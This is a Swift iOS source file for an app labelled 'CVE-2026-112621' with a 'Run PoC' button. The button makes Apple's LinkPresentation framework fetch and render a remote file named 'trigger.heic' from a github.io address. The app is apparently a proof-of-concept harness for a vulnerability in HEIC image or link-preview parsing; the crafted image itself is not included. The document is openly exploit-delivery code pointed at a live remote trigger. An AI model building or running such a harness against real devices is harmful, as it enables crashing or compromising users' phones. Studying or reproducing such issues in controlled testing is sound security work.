import SwiftUI
import LinkPresentation
import UIKit

struct ContentView: View {
    private let runTarget = URL(string: "https://794pn2s6fh-hub.github.io/amifukccunsgiod/trigger.heic")!

    @State private var isFetching = false
    @State private var metadata: LPLinkMetadata?
    @State private var logs: [LogEntry] = []
    @State private var provider: LPMetadataProvider?

    private let accentBlue = Color(red: 0.22, green: 0.49, blue: 0.79)
    private let panelColor = Color(uiColor: UIColor(white: 0.115, alpha: 1.0))
    private let insetColor = Color(uiColor: UIColor(white: 0.16, alpha: 1.0))

    var body: some View {
        ScrollView {
            VStack(alignment: .leading, spacing: 18) {
                Text("CVE-2026-112621")
                    .font(.system(size: 31, weight: .bold, design: .default))
                    .foregroundStyle(.white)
                    .lineLimit(1)
                    .minimumScaleFactor(0.8)
                    .padding(.top, 10)

                previewPanel

                Button(action: fetchPreview) {
                    Text("Run PoC")
                        .font(.system(size: 18, weight: .semibold))
                        .foregroundStyle(.black)
                        .frame(maxWidth: .infinity)
                        .frame(height: 56)
                        .background(accentBlue)
                        .clipShape(RoundedRectangle(cornerRadius: 17, style: .continuous))
                }
                .buttonStyle(PressDarkenButtonStyle())
                .disabled(isFetching)
                .accessibilityHint("Fetches LinkPresentation metadata for the configured HEIC target")

                HStack(alignment: .center) {
                    Text("Run log")
                        .font(.system(size: 19, weight: .semibold))
                        .foregroundStyle(.secondary)

                    Spacer()

                    Button("Clear") {
                        logs.removeAll()
                    }
                    .font(.system(size: 19, weight: .semibold))
                    .foregroundStyle(Color.red.opacity(0.85))
                    .buttonStyle(.plain)
                }
                .padding(.top, 0)

                logPanel
            }
            .padding(.horizontal, 16)
            .padding(.bottom, 28)
        }
        .background(Color.black.ignoresSafeArea())
        .preferredColorScheme(.dark)
        .onDisappear { provider?.cancel() }
    }

    private var previewPanel: some View {
        ZStack(alignment: .trailing) {
            if let metadata {
                LinkPreviewRepresentable(metadata: metadata)
                    .frame(maxWidth: .infinity)
                    .frame(height: 144)
            } else {
                Image(systemName: "safari.fill")
                    .font(.system(size: 27, weight: .regular))
                    .foregroundStyle(Color(uiColor: UIColor(white: 0.18, alpha: 1.0)))
                    .frame(width: 56, height: 56)
                    .background(Color(uiColor: UIColor(white: 0.66, alpha: 1.0)))
                    .clipShape(Circle())
                    .padding(.trailing, 20)
            }
        }
        .frame(maxWidth: .infinity)
        .frame(height: 166)
        .background(insetColor)
        .clipShape(RoundedRectangle(cornerRadius: 24, style: .continuous))
        .accessibilityLabel("Link preview")
    }

    private var logPanel: some View {
        ScrollViewReader { proxy in
            ScrollView(.vertical) {
                LazyVStack(alignment: .leading, spacing: 5) {
                    if logs.isEmpty {
                        Text("")
                            .font(.system(size: 12, design: .monospaced))
                    }

                    ForEach(logs) { entry in
                        HStack(alignment: .top, spacing: 10) {
                            Text(entry.time)
                                .font(.system(size: 12, weight: .regular, design: .monospaced))
                                .foregroundStyle(Color.white.opacity(0.52))
                                .frame(width: 58, alignment: .leading)
                                .fixedSize(horizontal: true, vertical: false)

                            Text(entry.message)
                                .font(.system(size: 12, weight: .regular, design: .monospaced))
                                .foregroundStyle(Color.white.opacity(0.91))
                                .frame(maxWidth: .infinity, alignment: .leading)
                                .fixedSize(horizontal: false, vertical: true)
                                .textSelection(.enabled)
                        }
                        .frame(maxWidth: .infinity, alignment: .leading)
                        .id(entry.id)
                    }
                }
                .frame(maxWidth: .infinity, alignment: .leading)
            }
            .onChange(of: logs.count) { _ in
                guard let last = logs.last else { return }
                proxy.scrollTo(last.id, anchor: .bottom)
            }
            .padding(14)
            .frame(height: 280)
            .background(panelColor)
            .clipShape(RoundedRectangle(cornerRadius: 26, style: .continuous))
        }
    }

    private func fetchPreview() {
        guard !isFetching else { return }
        provider?.cancel()
        metadata = nil
        isFetching = true
        addLog("START metadata fetch: \(runTarget.absoluteString)")

        let newProvider = LPMetadataProvider()
        provider = newProvider
        newProvider.startFetchingMetadata(for: runTarget) { result, error in
            DispatchQueue.main.async {
                self.isFetching = false
                self.provider = nil

                if let error {
                    self.addLog("ERROR metadata fetch: \(error.localizedDescription)")
                }

                if let result {
                    self.metadata = result
                    self.addLog("SUCCESS metadata fetch")
                    self.addLog("Icon provider present: \(result.iconProvider != nil)")
                }

                if result == nil && error == nil {
                    self.addLog("EMPTY metadata result")
                }
            }
        }
    }

    private func addLog(_ message: String) {
        let formatter = DateFormatter()
        formatter.locale = Locale(identifier: "en_US_POSIX")
        formatter.dateFormat = "HH:mm:ss"
        logs.append(LogEntry(time: formatter.string(from: Date()), message: message))
    }
}

private struct LinkPreviewRepresentable: UIViewRepresentable {
    let metadata: LPLinkMetadata

    func makeUIView(context: Context) -> LPLinkView {
        let view = LPLinkView(metadata: metadata)
        makeBackgroundsTransparent(in: view)
        return view
    }

    func updateUIView(_ uiView: LPLinkView, context: Context) {
        uiView.metadata = metadata
        makeBackgroundsTransparent(in: uiView)
    }

    private func makeBackgroundsTransparent(in view: UIView) {
        view.backgroundColor = .clear
        view.layer.backgroundColor = UIColor.clear.cgColor

        for subview in view.subviews {
            if subview is UILabel {
                subview.isHidden = true
            }
            makeBackgroundsTransparent(in: subview)
        }
    }
}

private struct PressDarkenButtonStyle: ButtonStyle {
    func makeBody(configuration: Configuration) -> some View {
        configuration.label
            .brightness(configuration.isPressed ? -0.07 : 0)
            .animation(.easeOut(duration: 0.12), value: configuration.isPressed)
    }
}

private struct LogEntry: Identifiable {
    let id = UUID()
    let time: String
    let message: String
}
